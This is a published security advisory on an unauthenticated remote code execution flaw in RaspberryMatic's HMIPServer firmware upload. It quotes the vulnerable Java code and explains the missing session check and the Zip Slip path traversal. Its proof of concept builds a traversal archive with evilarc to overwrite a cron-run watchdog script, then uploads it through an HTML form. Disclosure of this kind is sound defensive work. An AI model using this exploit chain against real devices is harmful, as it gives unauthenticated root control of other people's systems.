# Unauthenticated Remote Code Execution vulnerability through HMServer File Upload

Critical

[jens-maus](/jens-maus)
published
GHSA-q967-q4j8-637h
Mar 16, 2024

## Package

RaspberryMatic
(HMIPServer.jar / OCCU)

## Affected versions

≤ 3.73.9.20240130

## Patched versions

≥ 3.75.6.20240316

## Description

### Summary

RaspberryMatic / OCCU contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple issues within the Java based `HMIPServer.jar` component.

### Details

RaspberryMatric includes a Java based `HMIPServer`, that can be accessed through URLs starting with `/pages/jpages`. The `FirmwareController` class does however not perform any session id checks, thus this feature can be accessed without a valid session.

Code from `de.eq3.ccu.server.internal.FirmwareUploadRouteHandler`, note that the `sid` value is read, but not used. In particular, note that the `SessionVerifier.isSessionAlive` method is not called:

```
  public void handle(RoutingContext event) {
    String msgCommandFinishedWithErrors = "Handling of command finished with error.";
    HttpServerRequest request = event.request();
    if (logger.isDebugEnabled())
      logger.debug("Request: " + request.uri());
    String sid = request.params().get("sid");
    request.setExpectMultipart(true);
    request.uploadHandler(upload -> {
          String tempFile = DeviceFirmwareController.getTempFirmwarePath(upload.filename());
          upload.exceptionHandler(());
          boolean isValidFilename = DeviceFirmwareController.isValidFilename(upload.filename());
          if (isValidFilename) {
            upload.streamToFileSystem(tempFile, ());
          } else {
            request.response().putHeader("Content-Type", "text/html");
            request.response().end("${addDevFirmwareInvalid}");
            request.response().close();
            logger.warn(msgCommandFinishedWithErrors);
          }
        });
```

The controller can be reached through the URL `/pages/jpages/system/DeviceFirmware/addFirmware` as long as a valid `multipart/form-data` body is sent.

This allows an unauthenticated attacker to upload a malicious `.tgz` archive to the server, which will be automatically extracted without any further checks. Thus, the code within the `DeviceFirmwareController` controller contains multiple vulnerabilities, such as:

The code from the `addFirmware` method. At the end of the snippet, the `extractFileFromArchive2Tmp`method is called:

```
public String addFirmware(String sid, String firmwareFilePath) {
    String errorAddNewFile = "${addDevFirmwareInvalid}";
    File firmwareFile = new File(firmwareFilePath);
    try(GZIPInputStream gzipInputStream = new GZIPInputStream(new FileInputStream(firmwareFile));
        TarInputStream is = new TarInputStream(gzipInputStream)) {
      TarEntry entryx = null;
      while ((entryx = is.getNextEntry()) != null) {
        if (entryx.isDirectory())
          continue;
        extractFileFromArchive2Tmp(is, entryx);
      }
```

See the code from the `extractFileFromArchve2Tmp` method. Note, that it uses the unsanitized `entry.getName()`to generate the FileOutputStream and writes out the file. As this entry can contain `../`sequences, it is possible to break out of the predefined temp directory and write files to other locations outside this path. This vulnerability is commonly known as the [Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability) vulnerability.

```
private static void extractFileFromArchive2Tmp(TarInputStream is, TarEntry entry) throws IOException {
    boolean success = false;
    File tmpFirmware = new File(TMP_DIR);
    success = tmpFirmware.setWritable(true, false);
    if (!tmpFirmware.exists()) {
      success = tmpFirmware.mkdir();
    } else {
      success = true;
    }
    if (success) {
      byte[] data = new byte[2048];
      try(FileOutputStream entryStream = new FileOutputStream(TMP_DIR + FILE_SEP + entry.getName());
          BufferedOutputStream dest = new BufferedOutputStream(entryStream)) {
        int count;
        while ((count = is.read(data)) != -1)
          dest.write(data, 0, count);
        dest.flush();
        File folder = new File(TMP_DIR);
        File[] listOfFiles = folder.listFiles();
        for (File file : listOfFiles) {
          if (file.isFile())
            file.setReadable(true, false);
        }
      }
    } else {
      log.error("Not able to create " + TMP_DIR);
    }
  }
```

This can be used to overwrite arbitrary files on the main filesystem. For example, it is possible to overwrite the `watchdog` script in `/usr/local/addons/mediola/bin/`, which will be executed every five minutes through a cron job. Thus, this leads to arbitrary code execution.

### PoC

Create a .tgz archive with a custom `watchdog` script, using the tool [evilarc](https://github.com/h0ng10/evilarc).

```
python3 evilarc.py -f revshell.tgz -d 10 -p /usr/local/addons/mediola/bin -o unix watchdog

```

Upload the .tgz archive using the following HTML form adjusting the IP, thought:

```
<html>
	<head></head>
	<body>

        <form id='uploadForm' action='https://192.168.44.155/pages/jpages/system/DeviceFirmware/addFirmware' method='post' enctype='multipart/form-data'>
        Firmware: <input type='file' name='file' />
        <br/><br/><input id='btnSubmit' type='submit' value='upload' />
        </form>
	</body>
</html>
```

The service will respond with a `${addDevFirmwareInvalid}` which however is fine.

Inspect the watchdog script on the RaspberryMatic instance.

### Impact

Attackers can gain remote code execution as root user, allowing a full system compromise.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
